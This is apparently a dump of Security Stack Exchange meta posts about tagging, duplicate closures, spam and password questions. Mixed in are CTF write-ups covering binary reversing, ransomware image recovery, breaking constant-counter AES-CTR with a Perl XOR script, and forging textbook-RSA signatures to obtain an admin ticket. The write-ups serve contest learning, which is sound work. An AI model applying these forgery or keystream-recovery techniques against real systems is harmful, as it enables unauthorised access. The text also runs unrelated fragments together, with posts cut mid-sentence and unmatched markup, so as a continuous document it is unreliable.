</ul></li>
</ul></li>
<li><em>Association</em>: As noted by @Anders in his answer, tags help the system connect one question to others that are related. When looking for answers to a question, this can be <em>very</em> helpful. When answering a question it can also alert you to similar questions that might have useful information to link to, or otherwise include, in your answer.

<ul>
<li>This is affected more by having wrong tags on questions than by not having enough of the right tags, when you are answering questions. When searching for answers, both version of miss-tagging are a problem.</li>
</ul></li>
</ul>

<hr>

<p>Now, let's look at the, so far ignored, final part of your question: <em>are they really worth all the time and effort of maintaining them?</em></p>

<p><strong>Yes</strong>, IMHO, anyway. To begin with, there shouldn't be <em>that</em> much time and effort to maintain them. The false positives are the easiest to spot, for an expert in them, and to correct, if not allowed to collect. The missing tags are a little harder to spot, though just as easy to correct once discovered. </p>

<p>When reviewing the list of questions, from a feed, a filtered view, or even in a full listing of the questions, a false positive is a cry for help. Even low-rep users can suggest edits to questions, and 2K+ rep users can make instant edits. Editing a question to remove a bad tag takes mere seconds, and adding proper tags while you're there is but a few extra keystrokes as well. When you see a tag false positive in one of your areas of expertise, take the time to help the community and fix it, <em>before you forget</em>. If, after doing a few of those edits, you get the sense that others may not understand how that tag <em>should</em> be used, then you are in a position to make corrections or additions to the tag wiki that might improve that understanding. Letting it sit in the back of your mind for a while before making any changes can probably result in actual time spent on the edit to a few minutes at most.</p>

<p>While the site is small, at &lt;40K questions so far, it's easy to correct collected tag problems. If begun now there should be little need for massive efforts later, as has happened recently on the SuperUser stack in their <a href=""https://meta.superuser.com/questions/12295/logistics-for-cleanup-weekend-2"">Cleanup Weekend</a><sup>[¥]</sup>. One tag, <a href=""https://superuser.com/questions/tagged/recovery""><code>recovery</code></a> had over a thousand questions that needed to be corrected.</p>

<p>There is an implied question in you question: <em>is it worth <strong>my</strong> time and effort, to <strong>me</strong>, to maintain the tag system?</em> For that I'd have to day <em>it depends</em>. It's good for the community, so how important is the community to you? If the community <em>is</em> important to you, then it can be worth your time, even if you don't get any direct benefit from the tags. And, someday, they just might help you after all. If you need an answer <em>fast</em>, you're more likely to find it using tags than not. Using experiments today, a search for <code>apache ssl</code><sup>[ŧ]</sup> returned 199 results, while a search for <code>[apache] ssl</code><sup>[ŧ]</sup> returned 113 results. The 43% reduction has already reduced your reading time in search of an answer. To make it even better, a search for <code>[apache][ssl]</code><sup>[ŧ]</sup> returns 54 results, a mere 27% of the original with a consummate reduction in reading time to scan questions looking for your answer.</p>

<p>So, if you never need to look for an answer, don't use any of the other potentials of the tags, and are just here to display your knowledge without any connection or concern for the rest of the users, then maybe tags are not worth your time and effort to maintain. If any of those is not true, then maybe a small amount of your time and effort is justified. Finally, if all of those are false, you might need to find answers, you do want to access the power of tags, and you do care about the community and other users, then <strong>yes</strong>, it is worth the time and effort, including <em>your</em> time and effort, to maintain the tag system. Since you've already contributed to their maintenance with tag wiki edits, I think we know your answer anyway.</p>

<hr>

<p><strong>Notes</strong>:</p>

<p><sup>[¥]</sup>  To be fair, the need for 'Cleanup Weekend' was triggered more by the cleanup of non-HTTPS images than tag corrections, which received more effort. Still, tag cleanup was a big part of their work, and still is, for that ""weekend"" which ran over the scheduled time by quite a bit. As of this writing it is still in progress.</p>

<p><sup>[ŧ]</sup> Yes, I know that <code>SSL</code> is not the preferred term, <code>TLS</code> is. That was chosen to show the power of the tags. The final search automatically changed <code>[ssl]</code> to <code>[tls]</code> before doing the search, which filtered out an additional 22 questions; questions you probably don't want to read when you need an answer anyway.</p>

<p>It might have been a security issue that caused you to ask the question, but the question itself is more about how to configure your OS than it is about security. It's a bit unfortunate that the subsequent discussion got focused on wheater or not the answer was googable, since that is besides the point in my opinion.</p>

The question got quite a few useful answers that accepted the premise that there still IS a possible danger going out from quarantined files and explains how AV' softwares take this dangers into account and try to protect against them.

2731,2,2017-06-25T15:17:35.277,2,,"<h1>Reversing 100</h1>

<p>We were provided with a file called <code>pocket</code>. Using the <code>file pocket</code> command I found out it was a zip file. Extracting it I got a file a rar file called <code>biscuit</code>. Extracting it I got two files: <code>biscuit1</code> (a windows executable) and <code>biscuit2</code> (a password protected zip file). I guessed that we had to reverse biscuit1 to get the password. After analyzing it with radare2, there was a hint in the beginning of the program: <code>Please find sweets name starting from m for biscuit2.</code> and then asking for input. Instead of reversing the binary further I just searched for ""cookies"" and was surprised that wikipedia actually had a handy list of cookies!</p>

<p><a href=""https://i.stack.imgur.com/HDTKM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HDTKM.png"" alt=""cookies everywhere!""></a></p>

<p>Tried to extract <code>biscuit2</code> with <code>macaron</code> as password and got 3 files: <code>biscuit3</code>, <code>biscuit4</code> and <code>biscuit5</code>:</p>

<p><a href=""https://i.stack.imgur.com/3y4IA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3y4IA.png"" alt=""more biscuits!""></a></p>

<p>So I analysed the three files and knew I was on the right track with the hint given in <code>biscuit4</code>:</p>

<p><a href=""https://i.stack.imgur.com/lNmAA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lNmAA.png"" alt=""close to the flag...""></a></p>

<p>So the flag is a combination of <code>biscuit3</code> and <code>biscuit5</code>. Before analyzing <code>biscuit3</code> I thought let's do a Google reverse image look up but nothing interesting was brought up. I thought maybe there's some steganography involved. I tried <code>foremost</code> to scan for hidden files in the jpeg image. <code>foremost</code> is a handy tool that looks for certain magic bytes to recover files. I found a zip file with a text file inside contain part of the flag <code>creme</code>:</p>

<p><a href=""https://i.stack.imgur.com/9fXk1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9fXk1.png"" alt=""foremost to the rescue""></a></p>

<p>One file to go! <code>biscuit5</code> is a windows executable so I opened it with <a href=""https://github.com/radare/radare2"" rel=""nofollow noreferrer"">radare2</a> a reverse engineering framework. It's CLI based but once you get the hang of the basics it's quite cool! So first we open the file with <code>r2 biscuit5</code>. Then we need to analyse the binary with <code>aaa</code>. After that we can list all functions with <code>afl</code>. I grepped for the main function using the tilde notation <code>afl~main</code>. Then we need to ""seek"" to that address using <code>s 0x0040150b</code> or <code>s sym._main</code>. You might wonder ""why two mains?"", well same here but I analysed the other main and there was nothing interesting.</p>

<p><a href=""https://i.stack.imgur.com/YAXJj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YAXJj.png"" alt=""analyzing with radare2""></a></p>

<p>So I moved on and used <code>VV</code> to enter Visual Graph Mode, used <code>p</code> afterwards to show the addresses of each instruction. So we have a few local variables:
<a href=""https://i.stack.imgur.com/5l50v.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5l50v.png"" alt=""enter image description here""></a></p>

<p>Some values where assigned to those variables:</p>

<p><a href=""https://i.stack.imgur.com/qV8qr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qV8qr.png"" alt=""stacking values""></a></p>

<p>Then there was some magic happening with a loop, I guessed that must be the decryption phase:</p>

<p><a href=""https://i.stack.imgur.com/KzKYl.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KzKYl.jpg"" alt=""decryption magic""></a></p>

<p>Since the program didn't ask for input and the main function didn't seem to get suspicious values elsewhere I thought that the detected values in the beginning is probably the encrypted message and the loop is there to decrypt it. When it's done, it will branch to the right block and exit/return properly. So I thought let's use a debugger instead of manually trying to decrypt the message. I noted the address of the <a href=""https://en.wikipedia.org/wiki/Function_prologue#Epilogue"" rel=""nofollow noreferrer"">epilogue</a> and set a breakpoint accordingly in the <a href=""http://x64dbg.com"" rel=""nofollow noreferrer"">x32dbg debugger</a>. Then it was just a matter of running it!</p>

<p><a href=""https://i.stack.imgur.com/pO4ZW.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pO4ZW.png"" alt=""dynamic analysis""></a></p>

<p>The other part of the flag was visible in the <code>edx</code> register. With the hint from <code>biscuit4</code> I constructed the flag: <code>TMCTF{cream_choux}</code> buuuuut the site kept telling me it was incorrect. I tried several variations (upper case, ""creme"" à la française etc..). I decided to send the organizers a mail but they replied that they weren't giving any hints.

<p>The OP was preparing a presentation on firewalls. Apparently he (rightly) feared that simply listing IPTables rules may not be attractive and concrete enough to keep his audience interest, so he wanted to find a more concrete way to demonstrate the actual effect and role of these rules.</p>

<p>He suggested in his question to use two computers, this would allow to show how a firewall rule allows to allow or block a connection. Some answer suggested to use Wireshark, which is both a simple and visual tool allowing to highlight the technical details.</p>

<p>In your answer, 6 years later, you suggested to use <code>ufw</code> to generate the rules. IMHO, this suggestion doesn't seem to really fit the question. I don't see how this tool will allow the OP to better demonstrate the concrete firewall action to his audience. The OP problem was not about the rules, it was about how to demonstrate their concrete impact in a way he can communicate to his audience.</p>

<p>So, to sum-up, a new member comes and answer to a several years old question to promote a product which doesn't really answer to the OP request. I think that's why your post may have seem suspicious to the administrators.</p>

<p>Answers proposing a product are tolerated.</p>

<p>The best way to mention the product only to illustrate your explanation. Provide a factual and/or technical answer, explain how the OP question should be solved, the technologies / protocols / etc. involved. An then, at last, you can give a few examples of software implementing these ideas. You are even encouraged to present them with a critical point of view as far as the OP request is concerned.</p>

<p>For instance, on top of my head I remember <a href=""https://security.stackexchange.com/a/98014/32746"">an answer</a> where I mentioned the tool <em>SSLeuth</em> which was very well received by the community. But if you look my post, it comes at the end of the post, merely as an example of possible approaches to solve the concerns raised in previous points.</p>

<p>Other than that, I recently encountered <a href=""https://security.stackexchange.com/a/165746/32746"">a border-line answer</a>. It was posted by a new member, but on an active post, the author explicitly discloses his non-affiliation and his motives and the recommended tool may correspond to the OP request. His answer therefore did not fill the criterion to be considered as spam (but it still received a negative vote most probably due to the lack of content).</p>

<p>I hope you better understand now the distinction between post assumed as spam and post recommending or mentioning a software, and I hope this bad experience did not discourage you from posting other answers :) !</p>

<hr>

<p>For guidance, let's look at the conventions of citations in academic papers. In parallel to your list, I've seen all of the following:</p>

<ol>
<li><p>""In their seminal 1984 work on DoHickeys, Smith, Doe, and Li showed that DoHickeys have great foobar properties.""</p></li>
<li><p>""DoHickeys have great foobar properties [Smith 1984].""</p></li>
<li><p>""DoHickeys have great foobar properties<sup>1</sup>."" with a footnote or end-note.</p></li>
<li><p>""DoHickeys have great foobar properties."" and list them in the bibliography with no direct link to the sentence.</p></li>
<li><p>""DoHickeys have great foobar properties."" with no citation at all.</p></li>
</ol>

<p>The amount of page space that the author dedicates to crediting the referenced work actually conveys information about the significance of the idea / work and how common the knowledge is within that academic community. As an example, 1. is a nod that the referenced work is a cornerstone of the field, ex ""The key exchange mechanism introduced in 1976 by Diffie and Hellman is based on integer factorization"". Meanwhile while 5. may seem like academic dishonesty, it is perfectly appropriate when the idea has become so commonplace that it would be hard to find a single citation even if you wanted to, ex ""Integer factorization is used throughout cryptography"".</p>

<p>So I don't think there is a single right way to do it, it depends on the situation and how significant you, the author, feel that comment was.</p>

<p><a href=""https://security.stackexchange.com/questions/92643/is-it-necessary-to-add-csrf-tokens-for-rest-api"">Is it necessary to add CSRF tokens for REST API?</a></p>

<p>The problem is, I believe that this canonical question started from a false premise which resulted in incorrect answers, and is now being used to close duplicate questions about this topic, which I would very much like to discuss.  In detail:</p>

<p>The original question asked ""Is it okay to use a custom header to perform CSRF protection on REST endpoints and not validate the token?"".  What I want to know, but which this question didn't ask, is ""Is it necessary to use CSRF protection on REST endpoints at all?"".  Rather, the question assumed that CSRF protection is required, and got answers that also worked from that assumption.</p>

<p>Having given it a lot of thought, I'm very certain that CSRF protection is not at all helpful to REST endpoints, and that you are better off skipping it altogether.  Given this, I think the ""standard"" thing to do would be to add another answer to the question.  However, there is a problem: I would actually like some input about this question myself.  While I am pretty sure I am correct (that CSRF is unnecessary here), I'm not 100% certain, and I would like to see what others think.  I legitimately want to ask a question.  The question I want to ask is not discussed in this canonical question, but this question has been used to close other questions when others asked exactly what I want to ask.  I also feel like commenting on the original question or answers is not going to work for me, because this isn't just a matter of clarification: there are a number of details to discuss.</p>

<p>I think the original question could be edited to fit Security SE's guidelines by rephrasing it to something along the lines of 'What are some options for a small company on a budget to maintain a bug bounty program?'.</p>

2767,2,2017-08-11T00:00:10.253,2,,"<p>I agree that this wording still needs improvement, several years after this question was first asked.  For duplicates where there is a large amount of similarity it works great, but I've seen a lot of examples where the similarity is not apparent.</p>

<p>I'd like to <a href=""https://meta.stackexchange.com/questions/166707/changes-to-close-as-duplicate-part-deux"">quote David Fullerton</a> here (although in context he was talking about a different message to the user):</p>

<blockquote>
  <p>it sounds a bit like those old forum stickies that said “PLEASE SEARCH
  BEFORE POSTING YOUR QUESTION” – somebody already asked this exact same
  thing, so please stop bothering us. It's strong wording practically
  invites the user to argue: ""My question is not identical! I used
  different words!""</p>
  
  <p>So what do we want to tell the user instead? Something like, “Somebody
  already asked this. If that other question doesn't solve your problem,
  please clarify your question to explain how it's different.” Perfect:
  if the other question helps them, they're happy because they got an
  answer. If the other question doesn't help them, they know exactly
  what to do. No argument about how exact an ""exact duplicate"" needs to
  be.</p>
</blockquote>

<p>The way I see it, there are several sources of the problem here:</p>

<ol>
<li>The terminology makes sense to moderators* and long-time users, but
the ""possible duplicate of"" terminology is confusing (and even
offensive in some cases) to unfamiliar users.</li>
<li>The terminology was designed with obvious duplicates in mind, but not duplicates that aren't immediately obvious.</li>
<li>Different criteria are used to vote to close, including flimsy criteria like ""you should just read this canonical guide so we don't have to explain why you're doing it wrong"" or ""Part of this answer to this question offers a great explanation"", and these criteria are all being exaggerated and distorted by labelling them with the comment ""possible duplicate of [Question X]"".</li>
</ol>

<p>Duplicates are a trickier subject than they appear at first, and are a tricky enough subject that we can't expect new users to completely understand it.  Whole <a href=""https://stackoverflow.blog/2010/11/16/dr-strangedupe-or-how-i-learned-to-stop-worrying-and-love-duplication/"">blog posts</a> have been written about it.  We use the term ""duplicate"" to refer to the whole set of <a href=""https://stackoverflow.blog/2009/04/29/handling-duplicate-questions/"">copy-and-paste duplicates, same-exact-question-different-wording duplicates, and borderline duplicates</a>.  This includes the frequent situation where you have Q1 and Q2 that have a very similar answer, but Q1 is more general (or just plain different entirely).  From my understanding these <a href=""https://meta.stackexchange.com/questions/74080/close-as-duplicate-what-if-only-the-answer-is-a-duplicate"">shouldn't always be closed as duplicates</a>.  Confusingly, in this case the auto-comment <em>on the question</em> still reads ""duplicate"" when the duplicate is evident only in the <em>answers</em>.</p>

<p>For example, we have the popular question <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to Securely Hash Passwords</a>.  Some questions are obvious duplicates where the OP immediately understands why its a ""duplicate"":</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/17298/what-encryption-hash-function-i-should-use-for-password-securing"">What encryption hash function I should use for password
securing?</a></li>
<li><a href=""https://security.stackexchange.com/questions/17840/how-to-secure-passwords-when-site-is-opensource"">How to secure passwords when site is opensource</a></li>
</ul>

<p>However in other places ""possible duplicate of"" and similar comments appear for reasons that aren't immediately obvious, especially when the evidence for the duplication is in the answers, not the question itself:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/113003/possible-to-send-password-in-plain-text-with-sha-256"">Possible to send password in plain text with SHA-256?</a></li>
<li><a href=""https://security.stackexchange.com/questions/141250/why-are-only-passwords-hashed"">Why are only passwords hashed?</a></li>
<li><a href=""https://security.stackexchange.com/questions/64959/methods-for-slowing-down-a-hashing-algorithm"">Methods for slowing down a hashing algorithm</a></li>
<li><a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to implement iterations when hashing passwords?</a></li>
<li><a href=""https://security.stackexchange.com/questions/127689/how-secure-is-the-unix-sha-crypt-as-a-password-storage-algorithm"">How secure is the UNIX sha_crypt as a password storage algorithm?</a></li>
</ul>

<p>The last example is particularly salient because the user is looking for a very specific answer about sha_crypt and being told his question is a ""possible duplicate"" of a long comprehensive page that doesn't even mention his specific hash.  At least one of the users had the courtesy to say ""Welcome on Security SE. You will most likely find your answer in this thread: How to securely hash passwords?, in particular in the area following...""</p>

<p>We shouldn't be counting on every user to do what this user did and modify the auto-comment to explain things. This last example also shows how the use of the term ""possible duplicate"" is not very intuitive or explanatory.  I would recommend we change the auto-comment as you suggest to something like:</p>

<blockquote>
  <p>""This question was possibly answered in... If this question and answers don't
  solve your problem, please clarify to explain the differences in your
  question.""</p>
</blockquote>

<p>This wording avoids all these terse and technical-sounding ""possible duplicate of"" tags on these borderline duplicates.</p>

2768,2,2017-08-11T18:24:39.873,7,,"<h2>WannaFly</h2>

<p>(forensics, 100)</p>

<p>We have an image of an ext4 filesystem. It contains some pictures that have been encrypted and blurred by the ransomware WannaFly. Apart from the blurry pictures, there is a Python script called <code>...</code> and a <code>.bash_history</code> file which shows that <code>...</code> was executed with the argument <code>Hb8jnSKzaNQr5f7p</code>.</p>

<p>Looking at the Python script, we see that it transforms each input file in the following way:</p>

<ul>
<li>Load it as an image.</li>
<li>Encrypt the original image using AES-CFB, using the key passed as an argument, and with an IV which is derived from the time.</li>
<li>Blur the image and overlay a bird logo and some text.</li>
<li>Overwrite the original file with the blurred image, a newline and the encrypted image in base64 format.</li>
</ul>

<p>So to recover the original images, we need to extract the part of each file after the last newline, decode it as base64, and decrypt it with the known key and the IV.</p>

<p>The seed for deriving the IV is the current time when the script starts encrypting each file, rounded down to a whole second. That's going to be the timestamp of the file or a little before. The timestamps on the files are less than one second apart on average, so the time seed is likely to be exactly the file's timestamp or one second before.</p>

<h2>Stack Overflow</h2>

<p>(crypto, 100)</p>

<p>We have some broken encryption code in Python with PyCrypto. (<a href=""https://stackoverflow.com/questions/3154998/pycrypto-problem-using-aesctr/3155175#3155175"">Source</a>)</p>

<pre><code>from Crypto.Cipher import AES
...
crypto = AES.new(os.urandom(32), AES.MODE_CTR, counter=lambda: secret) 
</code></pre>

<p>What a badly-designed API — writing broken crypto code shouldn't be <em>that</em> easy! This code is using CTR with a <em>constant</em> counter. This means that there is a 16-byte string <code>m = AES_enc(key, secret)</code> such that each 16-byte block <code>b[i]</code> of the file is encrypted as <code>b[i] xor m</code>. All we have to do to decrypt the file is guess 16 consecutive bytes of it, which will give us the mask to xor with.</p>

<p>We start by guessing that the file begins with <code>%%PDF-1.</code>, which gives us the first 8 bytes of the 16-byte mask. Then look at the partially-decrypted output, find partially-corrupted PDF operators such as <code>/Contents</code>, <code>/MediaBox</code>, etc. and work out the remaining bytes in the mask to rectify those operators.</p>

<pre><code>#!/usr/bin/env perl
use warnings;
use strict;
my $guess1 = ""%PDF-1.3 \n1 0 ob"";
sysread STDIN, $_, 16;
my $mask = $_ ^ $guess1;
do {
    print STDOUT ($_ ^ $mask)
} while (sysread STDIN, $_, 16);

<h2>Secure Login</h2>

<p>(crypto, 200)</p>

<p>There is a server which responds to signed commands. The command we want is 2: “Collect flag”. This command requires a signed ticket whose plaintext starts with <code>ticket:admin|root|</code>.</p>

<p>A signed ticket is generated by encoding the ticket string as an integer $m$ and calculating $m^d \bmod n$ where $d$ is a secret. In other words, this is textbook RSA, and we have the public key only. It's a 2048-bit key with $e=65537$.</p>

<p>We can obtain the signature of messages in two forms:</p>

<ul>
<li>Messages that start with the string <code>ticket:user|</code> and contain another <code>|</code>, using command 1 “Register yourself as a user”.</li>
<li>Messages that start with the byte 0xff, using command 3 “Sign a message”.</li>
</ul>

<p>We want to obtain the signature of a message that starts with <code>ticket:admin|root|</code>, i.e. a message of the form $0x7469636b65743a61646d696e7c726f6f747c \times 2^{8b} + a$ where $a &lt; 2^{8b}$.</p>

<p>Let $u = $<code>ticket:user||</code> and $v = 0xffffffffffffffd3e3bae71d30e6eac5d3ad$. Then $u \times v = $<code>ticket:admin|root|l\xb3\xf0m\xca1\x16I\xe4\x0edS\xcc</code>.</p>

<p>Use command 1 on an empty user name and full name to get $u^d$. Use command 2 on <code>ffffffffffffd3e3bae71d30e6eac5d3ad</code> ($v$ without the leading 0xff) to get $v^d$. Multiply them; the result is</p>

2774,1,2017-08-24T19:33:09.037,-2,113,"<p>I was looking for a question on recommended password length for a typical usage case for users.  Say, a good password length that would guard against realistic threats, like a password cracker with an 8-GPU machine.  I couldn't find a good question, although I did find some likely duplicate questions that have issues described below.  Even though I feel this question can be answered well on this site, I strongly believe it'd be shot down and closed as either opinion-based or a duplicate if I don't address the issues here first.</p>

<p>Previously, most questions asking for a recommended password length that users should choose (like <a href=""https://security.stackexchange.com/questions/108918/how-many-characters-should-a-password-be"">this</a>) have been confusingly closed to this question about password length limits: <a href=""https://security.stackexchange.com/questions/144/how-long-should-the-password-be?"">How long should the password be?</a>.  Since most of the answers focus on what <strong>the administrator</strong> should put the limit at instead of what <strong>the user</strong> should choose, this seems like a case of irresponsible duplicate closures.  So I want to ask a new question and <em>not</em> mark it as a duplicate of this question.  In addition, to prevent confusion in the future, someone should probably edit the other question's title to make its purpose more clear and redirect the duplicate links to the new question.</p>

<p>I'm also a little concerned this could be closed as opinion-based, but it seems to meet the criteria on Stack Exchange for a <a href=""https://security.stackexchange.com/help/dont-ask"">constructive subjective question</a>.  Considering that there have been entire <a href=""https://www.wired.com/2016/05/password-tips-experts/"" rel=""nofollow noreferrer"">news articles</a> and <a href=""http://www.isy.vcu.edu/~gdhillon/Old2/secconf/pdfs/21.pdf"" rel=""nofollow noreferrer"">research papers</a> discussing how easily different passwords can be cracked, this seems like a question that would inspire fact-based, detailed answers, not casual recommendations grounded on anecdotal evidence.</p>

<p>I would definitely keep the scope of the question narrow.  It would apply mainly to the average person's Facebook or Amazon account assuming an offline attack is possible, not to the broad set of special circumstances like throwaway accounts , or accounts attacked by Anonymous.</p>

<p>I did some poking around with queries looking for things that needed MathML formulas.  Regular addition, subtraction, and multiplication don't really need MathML, but sqrt, exponents, complex division, etc. do make a strong case for MathML.  So I based my queries on the latter.</p>

<p>I used the <a href=""http://data.stackexchange.com/security/queries"" rel=""nofollow noreferrer"">Data Explorer</a> to get more systematic results, but the search function would also give us some rough estimates when it interprets things correctly <a href=""http://data.stackexchange.com/security/query/721617/how-many-posts-have-a-given-string-in-them"" rel=""nofollow noreferrer"">This query</a> shows how many posts use a search term, and <a href=""http://data.stackexchange.com/security/query/721594/find-posts-with-a-given-string"" rel=""nofollow noreferrer"">this query</a> was used to check what posts were caught by each search term to check for false positives. ""Posts"" here refers to questions and answers.</p>

<ul>
<li>""sqrt"" returned 24 posts</li>
<li>""^"" returned 1669 posts (of which 510 used ""2^"" but 145 used ""^("")</li>
<li>""formula"" returned
283 posts</li>
<li>""*("" returned 105 posts</li>
<li>"")*"" returned 121 posts.</li>
<li>""equation"" returned 211 posts</li>
<li>""/("" returned 122 posts, most of which have ""/("" inside code blocks, not formulas</li>

<p>Even the largest category here, ""^"", still only represents <strong>1.3% of all posts</strong> (and includes a lot of posts that don't really need MathML like ""2^8"").  This provides some evidence that almost all posts on this site do not have complex formulas. </p>

<p>Yeah, sure, there are other ways to analyze this information, like counting up how many posts have any of the terms instead of looking at each one separately, looking at the number of questions instead of the number of posts, or even making a regular expression that can accurately differentiate between a formula and a code block, but these results should give us a good enough picture to understand how prevalent certain math structures are. </p>

2814,2,2017-11-06T21:08:22.833,-9,,"<p>Your highly selective and chopped-up quote from ""Android patching cycles"" doesn't do it justice.</p>

<p>Here's the whole answer, with no edits:</p>

<blockquote>
  <p>I recommend ditching Android and getting a iPhone.</p>
  
  <p>Apple has a much better track record of supporting old iPhones,
  preventing malware/hack attacks against iOS, and booting
  scummy/fake/malicious apps out of the App Store before they cause
  serious damage.</p>
  
  <p>In 2012 I got an official Google Nexus phone because it was on sale
  and I liked having the option to install any app instead of being
  locked into a centralized app store. Instead, the promise of a ""free
  and open"" ecosystem turned into a nightmare in practice. Most app
  developers would include adware or spyware into free (and sometimes
  paid) apps, leaving the end-user with no idea who to trust. I found
  over the years that Google is generally poor at keeping malware out of
  the Google Play store, usually waiting for large numbers of people to
  get infected/compromised and booting out the offending app after a
  massive uproar. 2 years ago, there was a wildly popular
  ""antivirus/antimalware"" app for Android that turned out to be
  nonfunctional.</p>
  
  <p>Over the last 2 years, numerous quality issues and questionable design
  decisions further plagued my experience with both Android and Google
  browser apps - just to name a few: the new Google Hangouts UI removed
  most of the phone calling functionality, repeated ""incoming messages
  may be delayed"" and failure to automatically reconnect, searching in
  Google Hangouts for phone numbers largely doesn't work, my Nexus phone
  would repeatedly receive bad updates causing it to crash often, and
  even simple stuff like the built-in alarm clock app would fail to
  work. Adding insult to injury: I heard that my Nexus phone doesn't
  have an automated option to upgrade to the latest version of Android -
  an upgrade would require a manual sideload (rooting) the phone.</p>
  
  <p>This year, I finally got an iPhone and deprecated my old Google Nexus
  phone.</p>
  
  <p>Also: Android and Linux reportedly get the worst of the recent KRACK
  exploit and some devices may have to wait weeks or months for a patch.
  Microsoft supposedly patched it on Windows a while back, and the
  latest version of iOS 11 fixes it as well.</p>
  
  <p>Open source isn't a magic solution. While code reviews are nice, it's
  also nice to have the funding to afford timely and competent updates.
  Open source only works as far as people are willing to contribute.</p>
  
  <p>Obviously it's dangerous when your device no longer receives updates
  (except if you have some other practices or tools to properly lock it
  down in lieu of updates). If you have time to research code reviews
  and you want to stick with Android variants for some reason then you
  could go with Cyanogen (as Rory Alsop posted).</p>
</blockquote>

<p>Granted, some of it could be considered slightly rant-y. However, there's plenty of useful information in there about why someone should seriously consider ditching Android. At least, consider deleting or editing rant-y parts of it instead of nuking it outright.</p>

<p>Other times, I have written long answers only to have a Bear post an answer just before I was finished (and then, what's the point, really?)</p>

<p>It's one reason why I am so quick to try to get people to clarify their questions and to make sure they are asking what they think they might be asking. </p>

<p>To keep things in the spirit of on-topic Q&amp;As, I would recommend deleting off topic answers. </p>

<p>But this situation has now changed. You kept the off-topic parts while editing the answer to be on-topic. As there is now an evolving history to both the question and your answer. I think you did the right thing to section off the old part. </p>

  <p>I will stop contributing answers to this subforum</p>
</blockquote>

<p>This may be the source of your confusion and bad experience - back in the day we used to say <em>this is not a forum</em>. In particular, there are no threads. If you notice (try refreshing the page) answers appear in a random order if they have equal votes with top-voted answers moving to the top. Answers accepted by the asker come above all else.</p>

<p>The idea of the site is that each answer <em>should</em> as best as is possible given the question answer it wholly and completely; the more thoroughly the better. You shouldn't need to read multiple posts or pages of threads to put together what is going on: it should be there, in the accepted answer.</p>

<p>Sometimes questions suck, or are impossible to answer. Going off Schroeder's post, it sounds like you answered a question that might sound like:</p>

<blockquote>
  <p>How does X cyber company know China did it?</p>
</blockquote>

<p>and the answer is basically ""they dont; attribution is hard-to-impossible"". These kinds of questions tend to attract more discussion-y type answers, which might give the appearance of a forum, but the chatter isn't quite in the spirit of the site. We sort of tolerate it because there isn't really a better way to handle the fact some questions just don't have answers, but there it is.</p>

<p>However, this doesn't mean it is OK to post your experience about a handset in 200whenever as an answer to a problem someone faces, because it's not really relevant or interesting. I'm picking on this one example. You did however have some good points (again going of Schroeder's answer):</p>

<ul>
<li>Open nature of the android platform (many manufacturers, questionable-to-non-existent patching policies),</li>
<li>Closed nature of the iPhone platform: better QA on their app store includes.</li>
<li>Apple hardware and API design is superior in terms of security (security coprocessor for touchID etc).</li>
</ul>

<p>If you can back these up with some relevant explanations and links, based on facts, you're making a valid argument and this <em>is</em> an answer (provided of course you answer the question the asker asked). But you have to stick to the facts.</p>

<p>Schroeder has actually done you a favour here. The site has a low quality auto-ban filter completely outside of the control of the moderators that will answer-ban new users who consistently post poor quality answers. Moderators cannot deactivate it for you. By deleting your answers, you have avoided the downvote pile-on and subsequent ban you would have eventually arrived at.</p>

<p>But hey, look. Now you know. You can sit back, read a few popular answers, see how the site works and fit right in. Moderators certainly won't hold it against you - there's far too many users for them to remember any except the most problematic of muppets they have to deal with. If you're passionate about security there's plenty of questions to have a go at answering.</p>

2831,2,2017-11-28T19:53:26.427,1,,"<h2>How big of a problem is this?</h2>

<p>I had trouble finding a large number of examples of dumb tricks to generate passwords.  Could you provide more examples?  Perhaps the problem here is that it's subjective.  I think adding foreign words to diceware or an unprintable character at the end of your password is an interesting proposition to add a small amount of extra security, while other users may say ""just use a password manager to generate a 16-character alphanumeric string"".</p>

<h2>""Dumb"" isn't a closure reason</h2>

<p>As far as I was aware, just because a question is dumb, low-effort, or trivial doesn't mean it should be closed. Realistically, low-effort questions  clog up the site with low-quality content, so there is some merit in closing or <a href=""https://meta.stackexchange.com/questions/5221/how-does-deleting-work-what-can-cause-a-post-to-be-deleted-and-what-does-that"">deleting</a> them. However, none of the closure reasons are directly related to how dumb you think the question is.  That's what a downvote is for, and <a href=""https://gaming.meta.stackexchange.com/questions/5498/a-close-vote-is-not-a-super-downvote-please-dont-use-it-as-one"">a vote to close is not a super-downvote</a>.</p>

<h2>Deciding which password schemes are dumb tricks isn't simple</h2>

<p>You seem to assume that line between naïve passwords and smart passwords is clear, but in many cases there's a big grey area.  Password schemes falling into this grey area will create controversy when you try to close them as a dupe of a ""don't use dumb tricks"" question.</p>

<p>Some examples of questions that fall into the grey area include:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/113518/is-it-a-good-idea-to-combine-words-from-different-languages-to-increase-a-passwo?rq=1"">Is it a good idea to combine words from several languages?</a></li>

</ul>

<h2>The mythical canonical answer</h2>

<p>Every website about passwords tries to develop good explanations of do's and don'ts of password use.  What makes us different is that we have thousands of specific questions and answers, which in a world dominated by Google searches is a very good strategy.   While processes like clearing up duplicates can make it seem like the goal is to have just one canonical question and answer for every topic, in reality we aim to have a variety of similar questions and answers so that users can find the answer easily to their specific question (<a href=""https://stackoverflow.blog/2010/11/16/dr-strangedupe-or-how-i-learned-to-stop-worrying-and-love-duplication/"">source</a>). Closing lots of low-effort questions about basic tricks is a valid goal, but it comes with the caveat that many questions won't be so easy to mark as a duplicate and that's ok.   We're allowed to have several variations of the same question.  </p>

